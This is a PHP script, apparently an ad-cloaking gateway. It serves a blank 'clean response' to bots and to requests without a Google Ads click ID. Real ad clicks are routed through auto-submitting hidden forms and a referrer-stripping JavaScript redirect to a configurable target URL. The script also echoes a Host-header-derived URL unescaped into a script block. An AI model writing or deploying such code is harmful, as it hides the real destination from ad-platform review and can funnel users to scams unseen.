<?php
require_once 'functions.php';
require_once 'admin/stats_helper.php';

// Load admin settings if they exist
$admin_settings = [];
$settings_file = __DIR__ . '/admin/config.json';
if (file_exists($settings_file)) {
    $admin_settings = json_decode(file_get_contents($settings_file), true) ?: [];
}

$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$country = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? 'XX';
$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';
$random = mt_rand() / mt_getrandmax();

if (is_bot($ua)) {
    // Log bot access as blocked
    addRedirectRecord(
        $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        $country,
        $ua,
        $_SERVER['QUERY_STRING'] ?? '',
        'blocked',
        'Bot detected'
    );
    clean_response();
}

// Gán mặc định
$gclid = $_GET['gclid'] ?? '';
$url = '';
$try = '';

// Nếu POST, lấy từ form
if ($method === 'POST') {
    $gclid = $_POST['gclid'] ?? $gclid;
    $url = $_POST['url'] ?? '';
    $try = $_POST['try'] ?? '';
}

// Không có gclid thì trả về sạch
if (empty($gclid)) {
    // Log empty gclid as blocked
    addRedirectRecord(
        $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        $country,
        $ua,
        $_SERVER['QUERY_STRING'] ?? '',
        'blocked',
        'Empty gclid'
    );
    clean_response();
}

// Nếu request tới /redirect.php
if (strpos($_SERVER['REQUEST_URI'], '/redirect.php') !== false) {
    require 'redirect.php';
    exit;
}

// Load Balancer target URL from admin settings or use default
$urlTarget = $admin_settings['referral_url'] ?? '';

// If URL is empty, return clean response
if (empty($urlTarget)) {
    // Log empty target URL as blocked
    addRedirectRecord(
        $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        $country,
        $ua,
        $_SERVER['QUERY_STRING'] ?? '',
        'blocked',
        'Empty target URL'
    );
    clean_response();
}

if ($country === 'VN') {
    $targetUrl = $random < 0.7
        ? $urlTarget
        : $urlTarget;
} elseif ($country === 'US') {
    $targetUrl = $random < 0.2
        ? $urlTarget
        : $urlTarget;
} else {
    $targetUrl = $urlTarget;
}

// Nếu là POST và chưa có try
if ($method === 'POST' && empty($try)) {
    $subdomain = $_SERVER['HTTP_HOST'];
    $redirectUrl = "https://$subdomain/redirect.php?url=" . urlencode($url) . "&gclid=" . urlencode($gclid);
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta name="referrer" content="never">
        <meta http-equiv="cache-control" content="no-store">
        <meta http-equiv="expires" content="0">
        <meta name="robots" content="noindex,nofollow">
        <script>
            setTimeout(function(){
                window.location.href = "<?php echo $redirectUrl; ?>";
            }, 200);
        </script>
    </head>
    <body></body>
    </html>
    <?php
    exit;
}

// Nếu GET hoặc POST có try = render form auto submit
?>
<!DOCTYPE html>
<html>
<head>
    <meta name="robots" content="noindex,nofollow">
    <meta http-equiv="cache-control" content="no-store">
    <meta http-equiv="expires" content="0">
    <meta name="referrer" content="no-referrer">
</head>
<body>
<form id="form1" method="POST" action="/">
    <?php if ($method !== 'POST') { echo '<input type="hidden" name="try" value="2" />'; } ?>
    <input type="hidden" name="gclid" value="<?php echo htmlspecialchars($gclid); ?>" />
    <input type="hidden" name="url" value="<?php echo htmlspecialchars($targetUrl); ?>" />
</form>
<script>
    setTimeout(function(){
        document.getElementById('form1').submit();
    }, 200);
</script>
</body>
</html>
